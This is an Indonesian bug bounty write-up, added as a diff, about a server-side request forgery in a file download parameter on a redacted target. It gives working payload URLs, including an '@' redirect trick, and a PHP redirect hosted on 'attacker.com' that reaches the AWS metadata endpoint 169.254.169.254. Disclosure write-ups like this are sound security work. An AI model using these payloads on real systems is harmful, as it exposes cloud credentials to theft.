@@ -1,0 +1,85 @@
+I"Y<p><img src="/images/noobsec_awsdlb.jpg" alt="AWS Metadata Disclosure via &quot;Hardcoded Host&quot; Download Function" /></p>
+
+<p>Ketika kita mengunjungi website, baik website berupa aplikasi maupun company profile, ada kalanya kita menemukan sebuah tautan untuk men-download file dari website tersebut. File yang di-download dapat berupa guide, atau dokumen lainnya.</p>
+
+<p>Saat melakukan hunting pada private program di bugcrowd, penulis menemukan link untuk me-download file PDF dengan format seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/download?file=/2019/08/file.pdf
+</code></pre></div></div>
+
+<p>Ketika mengakses tautan tersebut, makan browser akan men-download file <code class="highlighter-rouge">file.pdf</code>. Yang pertama ada dalam pikiran ketika menemukan URL semacam itu, tentu kita akan bertanya-tanya apakah ada bug “Local File Download” pada link tersebut.</p>
+
+<p>Maka untuk melakukan pengetesan, penulis mencoba merubah URL menjadi seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/download?file=index.php
+</code></pre></div></div>
+
+<p>Namun tidak terjadi apapun :(</p>
+
+<p>Ada beberapa kemungkinan yang terpikirkan oleh saya ketika menemukan file <code class="highlighter-rouge">index.php</code> tidak dapat di download. Pertama, fitur download tersebut sudah diproteksi sehingga kita tidak dapat men-download file yang tidak diizinkan, atau kedua, fitur download diarahkan ke host lain mungkin sebagai CDN atau semacamnya sehingga file <code class="highlighter-rouge">index.php</code> tersebut memang tidak ada.</p>
+
+<p>Untuk kemungkinan yang kedua, kurang lebih seperti ini implementasi kode yang digunakan:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$host = 'https://cdn.redacted.com';
+$file = $_GET['file'];
+
+$download_url = $host .'/'. $file;
+</code></pre></div></div>
+
+<p>Pada kode diatas, terlihat bahwa <code class="highlighter-rouge">host</code> dari file yang akan di-download telah di <code class="highlighter-rouge">hardcode</code> pada kodingan, sehingga yang dapat kita manipulasi hanyalah parameter <code class="highlighter-rouge">file</code> saja.</p>
+
+<p><strong>URL Redirection</strong></p>
+
+<p>Untuk mengetahui apakah asumsi kita terhadap format URL tersebut benar, maka cara paling mudah adalah dengan mencoba melakukan redirect ke domain lain dengan menambahkan simbol <code class="highlighter-rouge">@</code> pada akhir dari nilai parameter <code class="highlighter-rouge">file</code> dan diikuti dengan domain yang kita jadikan tujuan.</p>
+
+<p>Contoh:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/download?file=/2019/08/file.pdf@www.google.com
+</code></pre></div></div>
+
+<p>Dan boom! Benar saja source code dari <code class="highlighter-rouge">www.google.com</code> ter-download.</p>
+
+<p><img src="/images/noobsec_awsdl1.jpg" alt="AWS Metadata Disclosure via &quot;Hardcoded Host&quot; Download Function" /></p>
+
+<p>Artinya, melalui kerentanan ini kita hanya dapat men-download data yang berada di luar server tersebut, tidak dapat mengakses file yang terdapat pada server target. Lalu data apa yang mungkin dapat kita peroleh?</p>
+
+<p><strong>AWS Metadata</strong></p>
+
+<p>Mengetahui bahwa server tersebut berada pada Amazon AWS, maka saya mencoba untuk meng-ekstrak AWS Metadata melalui kerentanan tersebut. AWS Metadata terdapat pada URL:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://169.254.169.254/latest/meta-data/
+</code></pre></div></div>
+
+<p>Maka URL pun dimodifikasi menjadi seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/download?file=/2019/08/file.pdf@169.254.169.254/latest/meta-data/
+</code></pre></div></div>
+
+<p>Namun lagi-lagi tidak terjadi apa-apa :(</p>
+
+<p>Setelah beberapa waktu, saya menyadari bahwa kemungkinan <code class="highlighter-rouge">host</code> yang di <code class="highlighter-rouge">hardcode</code> menggunakan protocol HTTPS, sehingga ketika kita mencoba untuk melakukan <code class="highlighter-rouge">redirect</code> ke URL Metadata yang berada menggunakan protocol HTTP, maka proses <code class="highlighter-rouge">redirect</code> tidak bekerja.</p>
+
+<p>Untuk itu, saya menggunakan sedikit trik, yaitu dengan menggunakan domain yang menggunakan HTTP lalu di-redirect lagi ke URL Metadata tersebut.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server Target ---&gt; HTTPS domain ---&gt; URL Metadata
+</code></pre></div></div>
+
+<p>Untuk itu, saya membuat file PHP sederhana untuk melakukan redirect ke Metadata:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nb">header</span><span class="p">(</span><span class="s1">'location: http://169.254.169.254/latest/meta-data/'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Lalu file tersebut diupload pada domain yang menggunakan HTTPS. Maka final URL nya menjadi seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/download?file=/2019/08/file.pdf@attacker.com/redirect.php
+</code></pre></div></div>
+
+<p>Dan Metadata pun berhasil di download!</p>
+
+<p><img src="/images/noobsec_awsdl2.jpg" alt="AWS Metadata Disclosure via &quot;Hardcoded Host&quot; Download Function" /></p>
+
+<p>Dan temuan ini mendapat severity <code class="highlighter-rouge">P1</code> di Bugcrowd ^^</p>
+
+:ET
